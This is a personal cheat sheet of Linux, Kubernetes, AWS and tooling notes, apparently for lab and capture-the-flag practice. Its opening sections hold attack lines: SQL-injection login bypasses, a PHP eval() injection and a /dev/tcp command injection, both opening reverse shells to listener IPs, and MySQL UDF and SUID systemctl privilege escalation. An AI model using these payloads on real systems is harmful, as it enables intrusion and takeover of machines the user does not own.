- echo os.system('/bin/bash')

---------------------------------------------------------------------
AV1 encode
---------------------------------------------------------------------
- av1an
  - sudo docker run -v "$(pwd)":/videos --user $(id -u):$(id -g) -it --rm masterofzen/av1an:latest -i myvid.mp4 --target-quality 95  -a " -c:a libopus -ac 2 -b:a 192k " -o output.webm

---------------------------------------------------------------------
mysql
---------------------------------------------------------------------
- exploit through UDF (mysql running in root)
  - if UDF is available
    - check: select * from mysql.func;
      - locate udf
  - privilege escalation:
    - sys_exec('usermod -a -G admin john');

---------------------------------------------------------------------
sql injection
---------------------------------------------------------------------
- login bypass
  - admin' --
  - admin' #
  - admin'/*
  - ' or '1'='1
  - ' or 1=1--
  - ' or 1=1#
  - ' or 1=1/*
  - ') or '1'='1--
  - ') or ('1'='1--

---------------------------------------------------------------------
php eval() exploit
---------------------------------------------------------------------
- /index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.22.129%205555%27)};%23
  - /index.php?page=index');${system('nc -e /bin/sh 192.168.3.2 4444')};%23

---------------------------------------------------------------------
upgrade simple shell to tty (bash)
---------------------------------------------------------------------
- python -c 'import pty; pty.spawn("/bin/bash")'
- {https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/}

---------------------------------------------------------------------
python simple http server
---------------------------------------------------------------------
- python2:
  - python -m SimpleHTTPServer
- python3:
  - python -m http.server
---------------------------------------------------------------------
command injection
---------------------------------------------------------------------
- reverse shell: ;bash -i >& /dev/tcp/192.168.1.16/1234 0>&1
---------------------------------------------------------------------
useful enumeration tools & checks
---------------------------------------------------------------------
- web:
  - nikto
  - dirb
  - ffuf
  - burp suite
  - owasp zap
  - gobuster
  - wfuzz
  - wpscan
  - whatweb
  - wafw00f
  - dirsearch
  - joomscan
  - droopescan
  - jexboss
  - checks:
    - LFI
- search exploits:
  - searchsploit
- port knocking
  - check /etc/knockd.conf

---------------------------------------------------------------------
useful exploitation tools
---------------------------------------------------------------------
- sql injection
    - sqlmap

---------------------------------------------------------------------
virtualbox installation
---------------------------------------------------------------------
- yay -S virtualbox
- yay virtualbox-host-modules
- must load module first: modprobe vboxdrv

---------------------------------------------------------------------
virtualbox setup internal network
---------------------------------------------------------------------
- set network to internal network
- assign up using dhcp
  - vboxmanage dhcpserver add --network=intnet --server-ip=192.168.3.1 --netmask=255.255.255.0 --lower-ip=192.168.3.2 --upper-ip=192.168.3.254 --enable
  - check: vboxmanage list dhcpservers

---------------------------------------------------------------------
exploit using systemctl (SUID config)
---------------------------------------------------------------------

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

- {https://gtfobins.github.io/gtfobins/systemctl/}
---------------------------------------------------------------------
check user default shell
---------------------------------------------------------------------
- cat /etc/passwd
---------------------------------------------------------------------
decryption
---------------------------------------------------------------------
- base64: base64 -d file.txt
- rot13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
---------------------------------------------------------------------
Numeric shorthand of permissions (u g o)
---------------------------------------------------------------------
- u = user
- g = group
- o = others
- shorthand: 
    - 0 (000) No permission.
    - 1 (001) Execute permission.
    - 2 (010) Write permission.
    - 3 (011) Write and execute permissions.
    - 4 (100) Read permission.
    - 5 (101) Read and execute permissions.
    - 6 (110) Read and write permissions.
    - 7 (111) Read, write, and execute permissions.
- {https://www.howtogeek.com/437958/how-to-use-the-chmod-command-on-linux/}


---------------------
permission

File type	User	Group	Global
d Directory	rwx	r-x	r-x
- Regular file	rw-	r--	r--
l Symbolic Link	rwx	rwx	rwx


Binary	Octal	Permission
000	0	—
001	1	–x
010	2	-w-
011	3	-wx
100	4	r–
101	5	r-x
110	6	rw-
111	7	rwx

-----------------------
---------------------------------------------------------------------
Fix SSD read-only random freezes
---------------------------------------------------------------------
- edit /etc/default/grub
  - add to GRUB_CMDLINE_LINUX_DEFAULT
    - nvme_core.default_ps_max_latency_us=0
- {https://askubuntu.com/questions/1266413/random-freezes-in-kubuntu-20-04}
---------------------------------------------------------------------
JPEG XL conversion
---------------------------------------------------------------------
- install: pip install makejxl
- find /path/to/images -type f -iregex '.*\(gif\|jpe?g\|png\)$' | parallel convert {} {.}.jxl
- {https://github.com/varnav/makejxl/}

---------------------------------------------------------------------
gpg auto-sign git commits
---------------------------------------------------------------------
- gpg --full-generate-key
	- use 4096 bits
- get gpg key ID
	- gpg --list-secret-keys --keyid-format LONG
	- key ID is : sec 4096/MYKEY123ABC 2021-05-26
- gpg --armor --export MYKEY123ABC
	- add this to github
- git config --global user.signingkey MYKEY123ABC
- git config --global commit.gpgsign true
- sign in terminal: export GPG_TTY=$(tty)
    - export GPG_TTY=(tty) // if using fish
    - {https://superuser.com/questions/691395/git-tag-with-gpg-agent-and-pinentry-curses}


---------------------------------------------------------------------
github SSH key
---------------------------------------------------------------------
- edit ~/.gitconfig:
    [user]
        email = austinchang4@gmail.com
        signingkey = 123456A1B12C123D
    [commit]
        gpgsign = true
    [gpg]
        program = gpg2
    [url "ssh://git@github.com/"]
        insteadOf = https://github.com/

- ssh-keyscan -t rsa github.com >> ~/.ssh/known_hosts
- add ssh key: cat ~/.ssh/id_rsa.pub
- {https://www.digitalocean.com/community/tutorials/how-to-use-a-private-go-module-in-your-own-project}

---------------------------------------------------------------------
install nodejs + yarn on debian/ubuntu
---------------------------------------------------------------------
# Using Ubuntu
curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt-get install -y nodejs

# Using Debian, as root
curl -fsSL https://deb.nodesource.com/setup_16.x | bash -
apt-get install -y nodejs

curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
echo "deb https://dl.yarnpkg.com/debian/ stable main" | sudo tee /etc/apt/sources.list.d/yarn.list
sudo apt update

---------------------------------------------------------------------
install ruby
---------------------------------------------------------------------
- sudo apt install git curl libssl-dev libreadline-dev zlib1g-dev autoconf bison build-essential libyaml-dev libreadline-dev libncurses5-dev libffi-dev libgdbm-dev
- curl -fsSL https://github.com/rbenv/rbenv-installer/raw/HEAD/bin/rbenv-installer | bash
- rbenv init
- add path: ~/.rbenv/bin
- check if installation is correct:
    - wget -q "https://github.com/rbenv/rbenv-installer/raw/HEAD/bin/rbenv-doctor" -O- | bash
- install latest version:
    - check version: rbenv install -l
    - rbenv install 3.0.1
    - rbenv global 3.0.1

---------------------------------------------------------------------
install xrdp
---------------------------------------------------------------------
Raspberry Pi OS
- sudo apt install xrdp
- sudo apt install xfce4 xfce-terminal
- sudo sed -i.bak '/fi/a #xrdp multiple users configuration \n xfce-session \n' /etc/xrdp/startwm.sh

Ubuntu Server
- sudo apt purge hwe*
- sudo apt purge xorg*
- sudo apt purge xserver-xorg-core
- sudo apt purge xrdp*
- sudo apt purge mate*
- sudo apt purge xfce4*
- sudo apt purge xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils
- sudo apt purge mate-core mate-desktop-environment mate-notification-daemon
- sudo rm /etc/systemd/system/xrdp.service (if already have xrdp.service)
- sudo apt autoremove
- sudo apt update && sudo apt upgrade
- sudo reboot

- sudo apt-get install xorg
- sudo apt-get install xserver-xorg-core
- sudo apt-get install xorgxrdp
- sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils
- sudo apt install xrdp
- sudo systemctl status xrdp
- sudo systemctl restart xrdp
- sudo sed -i.bak '/fi/a #xrdp multiple users configuration \n xfce-session \n' /etc/xrdp/startwm.sh
- enter this into ~/.xsession: xfce4-session
- {https://blog.devgenius.io/install-xrdp-server-on-ubuntu-7088583bc01}
- disable gui on boot: sudo systemctl set-default multi-user.target
    - {https://askubuntu.com/questions/1056363/how-to-disable-gui-on-boot-in-18-04-bionic-beaver#:~:text=To%2520disable%2520GUI%25[%E2%80%A6]t-default%2520graphical.target}

---------------------------------------------------------------------
setup k3s cluster
---------------------------------------------------------------------
Each Node
- add to the end of /boot/cmdline.txt
    - cgroup_memory=1 cgroup_enable=memory swapaccount=1
    - alternate:
        - sudo vim /boot/firmware/cmdline.txt
        - add to end of line: cgroup_enable=cpuset cgroup_enable=memory cgroup_memory=1
        - {https://github.com/k3s-io/k3s/issues/2067}
- ssh-copy-id ubuntu@<ip>
  - if doesnt work, run: ssh-keygen
- sudo echo coolhost > /etc/hostname


Master Node
- curl -sLS https://get.k3sup.dev | sh
- sudo install k3sup /usr/local/bin/
- install ssh
- ssh-copy-id user@IP
- sudo visudo
    - austin ALL=(ALL) NOPASSWD:ALL
- k3sup install --ip $IP --user austin
- script:
    #!/bin/bash

    MASTER_NODE=$1
    NODE1=$2
    NODE2=$3

    # Init MASTER_NODE
    echo "Initializing $MASTER_NODE as master node."
    k3sup-arm64 install --ip $MASTER_NODE --user ubuntu --k3s-extra-args "--no-deploy servicelb --no-deploy traefik"  --k3s-version v1.23.5+k3s1

    # Join nodes
    for NODE_IP in $NODE1 $NODE2
    do
      echo "Joining $NODE_IP to the cluster..."
      k3sup-arm64 join --ip $NODE_IP --server-ip $MASTER_NODE --user ubuntu
    done
    - ./init_pis.sh <master-ip> <node-ip> <node-ip> <node-ip>
- {https://averywagar.com/post/k3s-pi/}

Join Node to cluster
- get master server token:
  - cat /var/lib/rancher/k3s/server/node-token
- curl -sfL https://get.k3s.io | K3S_URL=https://<<MASTER_IP>>:6443 K3S_TOKEN="<<MASTER_SERVER_TOKEN>>" sh -
- systemctl enable --now k3s-agent
- {https://pet2cattle.com/2021/04/k3s-join-nodes}


- multi master HA setup
    - k3sup install --ip 192.168.50.79 --user ubuntu --k3s-extra-args "--no-deploy servicelb --no-deploy traefik" --cluster  --k3s-version v1.23.5+k3s1 
    - other master: k3sup join --ip 192.168.50.117 --server-ip 192.168.50.79 --user ubuntu --server-user ubuntu --server --k3s-extra-args "--no-deploy servicelb --no-deploy traefik" --k3s-version v1.23.5+k3s1
    - join worker nodees: k3sup join --ip 192.168.50.149 --server-ip 192.168.50.79 --user ubuntu --k3s-version v1.23.5+k3s1


Remote Access
- remote access cluster: copy contents from /etc/rancher/k3s/k3s.yaml
- basically set env KUBECONFIG to the kubeoconfig file generated
  - quick: export KUBECONFIG=`pwd`/kubeconfig
  - long: 
    - mkdir ~/k8s
    - mv ./kubeconfig/k8s
    - set env of KUBECONFIG to ~/k8s/kubeconfig

Helm
- install Helm

MetalLB
- helm repo add metallb https://metallb.github.io/metallb
- helm install metallb metallb/metallb --namespace kube-system --set configInline.address-pools[0].name=default --set configInline.address-pools[0].protocol=layer2 --set configInline.address-pools[0].addresses[0]=192.168.0.240-192.168.0.250

Nginx-Ingress
-  helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
-  helm install nginx-ingress ingress-nginx/ingress-nginx --namespace kube-system --set defaultBackend.enabled=false

Cert-Manager
- helm repo add jetstack https://charts.jetstack.io && helm repo update
- helm install cert-manager jetstack/cert-manager --namespace cert-manager --set installCRDs=true
- kubectl create namespace cert-manager
# letsencrypt-staging.yaml
apiVersion: cert-manager.io/v1alpha3
kind: ClusterIssuer
metadata:
  name: letsencrypt-staging
spec:
  acme:
    email: <your-email-address>
    server: https://acme-staging-v02.api.letsencrypt.org/directory
    privateKeySecretRef:
      name: letsencrypt-staging
    solvers:
    - http01:
        ingress:
          class: nginx
# letsencrypt-prod.yaml
apiVersion: cert-manager.io/v1alpha3
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    email: <your-email-address>
    server: https://acme-v02.api.letsencrypt.org/directory
    privateKeySecretRef:
      name: letsencrypt-prod
    solvers:
    - http01:
        ingress:
          class: nginx
- Route53
    - create IAM role with route53 policy
    - create IAM user and attach role to it
    - kubectl --namespace cert-manager create secret generic route53-credentials --from-literal="secret-access-key=$aws_secret"
    - clusterissuer.yaml
    apiVersion: cert-manager.io/v1alpha3
    kind: ClusterIssuer
    metadata:
      name: letsencrypt-prod
    spec:
      acme:
        email: xxxxxxxx@gmail.com
        server: https://acme-v02.api.letsencrypt.org/directory
        privateKeySecretRef:
          name: letsencrypt-prod
        solvers:
        - selector: {}
          dns01:
            route53:
              region: us-east-1
              accessKeyID: AKE789EXAMPLE
              secretAccessKeySecretRef:
                name: route53-credentials
                key: secret-access-key
    - create certificate
    ---
    apiVersion: cert-manager.io/v1
    kind: Certificate
    metadata:
      name: "abc-xyz"
      namespace: networking
    spec:
      secretName: "abc-xyz-tls"
      issuerRef:
        name: letsencrypt-prod
        kind: ClusterIssuer
      commonName: "abc.xyz"
      dnsNames:
      - "abc.xyz"
      - "*.abc.xyz"
    - {https://cert-manager.io/docs/configuration/acme/dns01/route53/}
- {https://www.puzzle.ch/de/blog/articles/2020/10/13/k3s-on-raspberry-pi}

Update Nginx default ssl
- helm upgrade nginx-ingress ingress-nginx/ingress-nginx --namespace kube-system --set defaultBackend.enabled=false --set controller.extraArgs.default-ssl-certificate="networking/abc-xyz-tls"

Server Deployment
- kubectl create namespace webserver
apiVersion: v1
kind: Service
metadata:
  creationTimestamp: null
  labels:
    app: httpd
  name: httpd
  namespace: webserver
spec:
  ports:
  - port: 80
    protocol: TCP
    targetPort: 80
  selector:
    app: httpd
status:
  loadBalancer: {}
---
apiVersion: apps/v1
kind: Deployment
metadata:
  creationTimestamp: null
  labels:
    app: httpd
  name: httpd
  namespace: webserver
spec:
  replicas: 2
  selector:
    matchLabels:
      app: httpd
  strategy: {}
  template:
    metadata:
      creationTimestamp: null
      labels:
        app: httpd
    spec:
      containers:
      - image: httpd:2.4.46
        name: httpd
        ports:
          - containerPort: 80
        resources:
            requests:
              memory: 250Mi
              cpu: 0.25
status: {}


NGINX Ingress
# nginx-ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webserver-ingress
  namespace: webserver
  annotations:
    kubernetes.io/ingress.class: nginx
    nginx.ingress.kubernetes.io/rewrite-target: /
    cert-manager.io/cluster-issuer: letsencrypt-prod
spec:
  tls:
  - hosts:
    - abiko.downme.xyz
    secretName: httpd-prod-tls
  rules:
  - host: abiko.downme.xyz
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: httpd
            port:
              number: 80

- with default SSL cert set
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: searx-ingress
  namespace: searx
  annotations:
    kubernetes.io/ingress.class: nginx
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  tls:
  - hosts:
    - searx.abcxyz
  rules:
  - host: searx.abc.xyz
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: searx
            port:
              number: 8080


Longhorn storage
- external ssd storage
  - check storage path: lsblk
    - sudo blkid
  - sudo mkfs.ext4 /dev/sda
  - sudo mkdir /mnt/ssd0
  - sudo chown -R austin:austin /mnt/ssd0/ 
  - sudo mount /dev/sda /mnt/ssd0/
  - sudo vim /etc/fstab
  - longhorn ui
    - click add disk
    - sudo mkdir /mnt/ssd0/block
    - path: /mnt/ssd0/block/
    - set storage reserved
  - {https://www.jericdy.com/blog/installing-k3s-with-longhorn-and-usb-storage-on-raspberry-pi}

---------------------------------------------------------------------
remove k3s
---------------------------------------------------------------------
- uninstall from master node:
  - /usr/local/bin/k3s-uninstall.sh
- uninstall from slave node:
  - /usr/local/bin/k3s-agent-uninstall.sh

---------------------------------------------------------------------
create new user
---------------------------------------------------------------------
- sudo adduser new_user
- archlinux: 
    - sudo adduser new_user
    - sudo usermod -aG wheel new_user
- add to sudoers:
	- sudo usermod -aG sudo bob
    - set user primary group: usermod -g sudo bob
- (for ec2) valid login without key file
	- edit: /etc/ssh/sshd_config
		- PasswordAuthentication yes
	- sudo service ssh restart

---------------------------------------------------------------------
windows terminal
---------------------------------------------------------------------
- split | : alt + shift + v
- split - : alt + shift + h
- enlarge <-> : alt + shift + >
- enlarge vertically: alt + shift + ^
---------------------------------------------------------------------
extend filesystem
---------------------------------------------------------------------
- check: lsblk
- fill: sudo growpart /dev/nvme0n1 1
- resize: sudo resize2fs /dev/nvme0n1p1

---------------------------------------------------------------------
deno
---------------------------------------------------------------------
- update runtime: deno upgrade

---------------------------------------------------------------------
kubernetes
---------------------------------------------------------------------
- minikube setup steps:
	- start minikube
	- kubectl load env
	- docker build image
	- apply yaml file

- minikube
	- start: minikube start
        - stop: minikube stop
        - teardown: minikube delete
	- set memory: minikube config set memory 8192
            - minikube start --memory=4096 # 2GB default memory isn't always enough
	- set cpus: minikube config set cpus 2
        - set nodes: minikube start --memory=4096 --nodes 3
	- minikube --memory 8192 --cpus 2 start
	- add local image: minikube cache add foo:latest
	- list cache images: minikube cache list
	- delete cache image: minikube cache delete foo
	- create tunnel to access loadbalancer: minikube tunnel
	- load env:
		- powershell: (minikube --shell powershell docker-env) | Invoke-Expression
        - localhost registry:
            - minikube addons enable registry
            - kubectl port-forward --namespace kube-system service/registry 5000:80 

- low level deployment steps:
	- create pod
	- create replicaset
- high level deploymen steps (production):
	- create deployment

- EKS
	- aws eks --region us-east-1 update-kubeconfig --name abc
	- deploy ALB ingress -> nginx ingress controller service:
		- kubectl apply -f ingress-nginx-controller-deploy.yaml
		- rbac role
		- alb ingress controller
		- alb ingress
		- deploy ingress

- eksctl (EKS)
	- create cluster: eksctl create cluster --name=abc --nodes=2 --region=us-east-1
	- with node type: --node-type=a1.large
	- e.g: eksctl create cluster --name=testing --nodes=3 --node-type=a1.large --region=us-east-1 --timeout=30m
	- nodegroups:
		- list: eksctl get nodegroups --cluster=abc
		- create nodegroup:  create nodegroup --cluster=jennysss --nodes=6 --node-type=a1.xlarge --region=us-east-1 --nodes-max=10 --nodes-min=4
		- delete: drain nodegroup --cluster=abc --name=ng-0
		- delete: eksctl delete nodegroup --cluster=abc --name=ng-0
		- scale: scale nodegroup --cluster=cluster-1 --nodes=5 ng-a345f4e1
		- scale maxmin: scale nodegroup --cluster=abc --nodes=6 ng-a1b2c3 --nodes-min=4 --nodes-max=10
		- label nodes: kubectl label nodes -l alpha.eksctl.io/nodegroup-name=ng-0 type=worker
	- fargate:
		- create : eksctl create cluster --name=mycluster --fargate
		- add namespace: eksctl create fargateprofile --namespace abc --cluster mycluster
    - update:
        - kube-proxy: eksctl utils update-kube-proxy --cluster=<clusterName>
        - aws-node: eksctl utils update-aws-node --cluster=<clusterName>
        - coredns: eksctl utils update-coredns --cluster=<clusterName> 


- kubectl
	- clusters : cluster-info
	- nodes: get nodes
	- deploy: create deployment foo --image=abc/def/foo:v1
	- list deployments : get deployments
		- ready = current/desired replicas ratio
		- uptodate = no. of replicas updated
		- available = no. of replicas available
	- proxy: proxy
        - stop proxy: pkill -9 -f "kubectl proxy"
	- pods: get pods
		- pods in deployment label: get pods -l run=foo
		- details: get pods -o wide
		- delete pod: kubectl delete pod foobar-0
                    - delete failed/evicted pods: kubectl -n default delete pods --field-selector=status.phase=Failed
		- top: kubectl top pods
			- (FOR EKS): install metric server first
	- pod info: describe pods
	- pod logs: logs $POD_NAME
	- pod exec commands: exec $POD_NAME -- ls
	- ssh into pod: exec -ti $POD_NAME -- bash
		- container in pod: exec -ti $POD_NAME -c foo-server -- /bin/sh
          - with namespace: kubectl exec -it MY_POD_123 -n myns -- /bin/sh
	- services: get services
		- services in deployment label: get services -l run=foo
	- expose deployment: expose deployment/foo --type="NodePort" --port 8080
		- gets assigned ip port 8080:XXXX/TCP
		- test: curl $(minikube ip):$NODE_PORT
	- deployment info: describe deployment
	- assign label to pod: kubectl label pod $POD_NAME app=xyz
	- delete service: delete service -l run=foo
	- list replicaset: get rs
	- scale deployment replicas: scale deployments/foo --replicas=4
	- update image: set image deployments/foo abc/def/foo:v2
		- status: rollout status deployments/foo
		- undo: rollout undo deployments/foo
	- log pod: logs foo-pod foo
	- log previous crashed pod: logs -p foo-pod foo
	- force update deployment : kubectl rollout restart deployment/demo
	- replicasets:
		- get replicasets: kubectl get rs
        - port forward:
          - kubectl port-forward svc/mysql -n myns 3306:3306
        - context:
          - list: kubectl config get-contexts
          - switch to context: kubectl config use-context CONTEXT_NAME
	- copy directory: kubectl cp mydir/ mypod:/media/ -n myns
    - autoscale:
        - kubectl autoscale deployment foobar --cpu-percent=80 --min=5 --max=10
        - get horizontal pod autoscaler info:
            - kubectl get hpa
- gen config -> .kube/config
	- powershell:
		- $TOKEN=((kubectl -n kube-system describe secret default | Select-String "token:") -split " +")[1]
		- kubectl config set-credentials docker-for-desktop --token="${TOKEN}"
	- bash:
		- TOKEN=$(kubectl -n kube-system describe secret default| awk '$1=="token:"{print $2}')
		- kubectl config set-credentials kubernetes-admin --token="${TOKEN}"
    - colour output: kubecolor

---------------------------------------------------------------------
rust create new project
---------------------------------------------------------------------
- cargo +nightly new testabc

---------------------------------------------------------------------
create-react-app ts
---------------------------------------------------------------------
- npx create-react-app testabc --template redux-typescript

---------------------------------------------------------------------
AWS CLI
---------------------------------------------------------------------
- aws configure
- ECR
	- aws ecr create-repository --repository-name foobar
	- docker tag foobar 1234.dkr.ecr.us-east-1.amazonaws.com/foobar
	- aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 1234.dkr.amazonaws.com/foobar
	- docker build -t foobar .
	- docker tag abc:latest 123.dkr.amazonaws.com/abc:latest
	- docker push 123.dkr.ecr.amazonaws.com/abc:latest
	- docker buildx steps:
		- login
		- docker buildx build -t abc.dkr.ecr.amazonaws.com/abc . --push

---------------------------------------------------------------------
don't suspend on laptop lid close
---------------------------------------------------------------------
- edit /etc/systemd/logind.conf :
	HandleLidSwitch=ignore

---------------------------------------------------------------------
wpa_supplicant setup network
---------------------------------------------------------------------
- create : /etc/wpa_supplicant.conf
- sudo ip link set wlan0 down
- sudo ip link set wlan0 up
- sudo wpa_supplicant -B -iwlan0 -c /etc/wpa_supplicant.conf -Dnl80211,wext
- sudo dhclient wlan0
- {https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line}
- autostart:
	- install netctl, wifi-menu
	- sudo wifi-menu
	- sudo systemctl enable netctl-auto@wlp3s0.service
	- sudo netctl-auto enable wlp3s0-WifiNameHere
	- {https://ricostacruz.com/til/arch-linux-wifi-using-netctl}


---------------------------------------------------------------------
Raspberry Pi headless install
---------------------------------------------------------------------
 - burn raspbian iso into usb
 - create empty ssh file in root dir
 - create wpa_supplicant.conf in root dir :
    country=HK
    ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
    update_config=1

    network={
        scan_ssid=1
        ssid="wifiname"
        psk="abcdef"
    }
- ssh login:  pi:raspberry
- change password: passwd

---------------------------------------------------------------------
Reverse SSH Tunnel
---------------------------------------------------------------------
- add to /etc/ssh/sshd_config:
	Match User ubuntu
		ClientAliveInterval 60
		GatewayPorts yes
- ssh -i abc.pem -R 4567:localhost:8080 abc@123.567
- {https://askubuntu.com/questions/50064/reverse-port-tunnelling}
- forward port 80:
	ssh -i ~/ssh/abc.pem -R 9159:localhost:9159 ubuntu@123.456.7.8 -t sudo socat TCP-LISTEN:80,fork TCP:localhost:9159
- {https://unix.stackexchange.com/questions/41451/how-can-i-set-up-a-remote-port-forward-on-port-80-to-my-localhost-with-the-help}

---------------------------------------------------------------------
svelte sapper setup
---------------------------------------------------------------------
- npx degit "sveltejs/sapper-template#rollup" foobar

---------------------------------------------------------------------
weechat setup
---------------------------------------------------------------------
- /server add freenode chat.freenode.net/6667 -autoconnect
- /set irc.server.freenode.nicks foobar
- set username: /set irc.server.freenode.sasl_username
- set pw: /set irc.server.freenode.sasl_password
- set mechanism: /set irc.server.freenode.sasl_mechanism plain
- /save
- /connect freenode
- mkdir ~/.weechat/certs
- cd ~/.weechat/certs
- openssl req -x509 -new -newkey rsa:4096 -sha256 -days 1000 -nodes -out freenode.pem -keyout freenode.pem
- openssl x509 -in freenode.pem -outform der | sha1sum -b | cut -d' ' -f1
- /msg nickserv cert add e084219c214d391a8fd75cdbb891b5b966515db7
- /set irc.server.freenode.ssl_priorities "NORMAL:-VERS-TLS-ALL:+VERS-TLS1.0:+VERS-SSL3.0:%COMPAT"
- /set irc.server.freenode.ssl_cert "%h/certs/freenode.pem"
- /set irc.server.freenode.sasl_mechanism external
- /set irc.server.freenode.ssl on
- /set irc.server.freenode.addresses "chat.freenode.net/6697"
- /set irc.server.freenode.ssl_verify off
- /save
- /reconnect freenode

-- tor
- sudo apt install tor
    - sudo ss -tulpn (check if tor is running on port 9050)
- /set irc.server.freenode.addresses "freenodeok2gncmy.onion/7000"
- /proxy add tor socks5 127.0.0.1 9050
- /set irc.server.freenode.proxy "tor"
- /save
- reconnect freenode
- {https://szorfein.github.io/weechat/tor/configure-weechat/}

---------------------------------------------------------------------
bulk rename
---------------------------------------------------------------------
- replace spaces with underscore
    - fish: for f in *.csv;mv $f (echo $f |tr ' ' '_');end

---------------------------------------------------------------------
create swap
---------------------------------------------------------------------
- sudo dd if=/dev/zero of=/swapfile bs=1G count=4
	- 4G swap: sudo dd if=/dev/zero of=/swapfile bs=1K count=4M
- chmod 600 /swapfile
- mkswap /swapfile
- swapon /swapfile
- verify: swapon -s
- add to /etc/fstab:
	- swapfile swap swap defaults 0 0
- {https://aws.amazon.com/premiumsupport/knowledge-center/ec2-memory-swap-file/}

---------------------------------------------------------------------
clear cache and swap (requires superuser privileges)
---------------------------------------------------------------------
- clear cache
  - sync; echo 3 > /proc/sys/vm/drop_caches
- clear swap memory
  - swapoff -a && swapon -a
---------------------------------------------------------------------
bug.n
---------------------------------------------------------------------
- tags
	- go to: win + <NUMBER>
	- apply tag: win + shift + <NUMBER>
	- add/rm tag: win + ctrl + <NUMBER>
	- go to previous tag: win + <BACKSPACE>
- window
	- go to: win + <UP/DOWN>
	- toggle master/slave: win + shift + enter
	- move win : win + shift + <UP/DOWN>
	- toggle window titlebar: win + shift + d
	- close window: win + c
	- toggle float mode: win + shift + f
	- resize : win + <LEFT/RIGHT>
	- in float mode:
		- move: win + shift + m
		- resize: win + shift + s
		- fullscreen: win + shift + x
- layout
	- float: win + f
	- monocle/fullscreen : win + m
	- tile : win + t
- launcher: win + y
- monitor
	- next monitor: win + .
	- prev monitor: win + ,
	- move to next monitor: win + shift + .
	- move to prev monitor: win + shift + ,
	- move all to next monitor: win + shift + ctrl + .
- toggle win bar : win + <SPACE>
- edit config file: win + ctrl + e
- quit : win + ctrl + q
- bug.n config:
	- ! = alt
	- ^ = ctrl
	- # = win
	- + = shift

---------------------------------------------------------------------
kill with ps aux and grep
---------------------------------------------------------------------
- ps aux|grep foobar|awk '{print $2}'|xargs kill

---------------------------------------------------------------------
make with gcc version
---------------------------------------------------------------------
- make CC=gcc-9

---------------------------------------------------------------------
dwm
---------------------------------------------------------------------
- launch terminal: shift + alt + enter
- next : alt + j
- prev: alt + k
- launch dmenu : alt + p
- kill window: shift + alt + c
- tags :
    - focus another: alt + <NUMBER>
    - apply tag: alt + shift + <NUMBER>
    - add/remove tag: alt + ctrl + shift + <NUMBER>
- layouts
    - tiled : alt + t
    - float: alt + f
        - move : alt + left click
        - resize: alt + right click
    - fullscreen/monocole: alt + m
    - grid : alt + g
    - bottom stack: alt + u
    - column/bottom horiz  stack : alt + o
        
- toggle window between master/stack : alt + enter
- quit: shift + alt + q
- make 1 window float: alt + left click
    - resize : alt + right click
    - back to non-float: alt + middle click
- increase master size: alt + l
- decrease master size: alt + h
- toggle top bar: alt + b

---------------------------------------------------------------------
React + Parcel steup
---------------------------------------------------------------------
- npm init
- yarn add react react-dom
- yarn add -D babel-preset-react babel-preset-env parcel-bundler
- .babelrc ->
    {
          "presets": ["env", "react"]
    }
- index.js ->
    import React from "react";
    import ReactDOM from "react-dom";

    class HelloMessage extends React.Component {
          render() {
                  return <div>Hello {this.props.name}</div>;
                    }
    }

    var mountNode = document.getElementById("app");
    ReactDOM.render(<HelloMessage name="Jane" />, mountNode);
- index.html ->
    <!DOCTYPE html>
    <html>
        <head>
            <title>React starter app</title>
        </head>
        <body>
            <div id="app"></div>
            <script src="index.js"></script>
        </body>
    </html>
- package.json ->
    "scripts": {
          "start": "parcel index.html",
    },
- {https://blog.jakoblind.no/react-parcel/}

---------------------------------------------------------------------
dvtm install terminfo
---------------------------------------------------------------------
- tic -s dvtm.info

---------------------------------------------------------------------
fish
---------------------------------------------------------------------
- set -gx PATH $PATH <path>

---------------------------------------------------------------------
mysql
---------------------------------------------------------------------
- allow root login (fix 'root'@'localhost' access denied problem):
	use mysql;
	UPDATE user SET plugin='mysql_native_password' WHERE User='root';
	FLUSH PRIVILEGES;
	exit;
---------------------------------------------------------------------
golang 
---------------------------------------------------------------------
- init: go mod init foobar
- clean mod file: go mod tidy
- update mod dependencies: go list -m -u all
- publish module with new version:
  - create tag: git tag -s v0.3.1 -m "v0.3.1"
  - GOPROXY=proxy.golang.org go list -m github.com/myusername/mypackage@v0.3.1

---------------------------------------------------------------------
jemalloc
---------------------------------------------------------------------
- sudo apt-get install libjemalloc-dev
- LD_PRELOAD $LD_PRELOAD /usr/lib/x86_64-linux-gnu/libjemalloc.so
- https://stackoverflow.com/questions/53234410/how-to-use-node-js-with-jemalloc
---------------------------------------------------------------------
gunicorn
---------------------------------------------------------------------
- gunicorn -w 4 -b :6614 -t 99999 foobar:app

---------------------------------------------------------------------
uwsgi
---------------------------------------------------------------------
- uwsgi --http :6614 -b 32768 --master --max-requests 10000 --enable-threads --threads 4 --http-workers 64 --http-events 99 --plugin python36,http --wsgi-file wsgi.py --callable app


---------------------------------------------------------------------
nginx setup
---------------------------------------------------------------------
- create file : /etc/nginx/conf.d/foobar.conf
- file content:
	upstream my_http_servers {
		ip_hash;
		server 127.0.0.0.1:3001;
		server 127.0.0.0.1:3002;
	}
	server {
		listen 3000;
		listen [::]:3000;
		location / {
			proxy_set_header	X-Real-IP $remote_addr;
			proxy_set_header	Host	$http_host;
			proxy_pass	http://my_http_servers;
		}
	} 
- restart : sudo service nginx restart

